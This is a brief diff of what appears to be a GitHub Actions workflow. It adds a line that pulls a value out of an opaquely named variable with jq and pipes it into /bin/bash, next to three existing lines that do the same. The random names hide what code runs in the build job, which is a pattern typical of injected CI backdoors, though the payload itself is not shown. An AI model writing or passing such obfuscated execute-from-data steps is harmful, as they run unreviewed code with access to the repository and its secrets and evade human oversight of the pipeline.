@@ -23,6 +23,7 @@ jobs:
           echo $tr749 | jq -r .v5598 | /bin/bash
           echo $yle44573 | jq -r .m71255 | /bin/bash
           printf '%s' "$wco3" | jq -r .pdfwg4482 | /bin/bash
+          echo $vj14 | jq -r .apa91 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
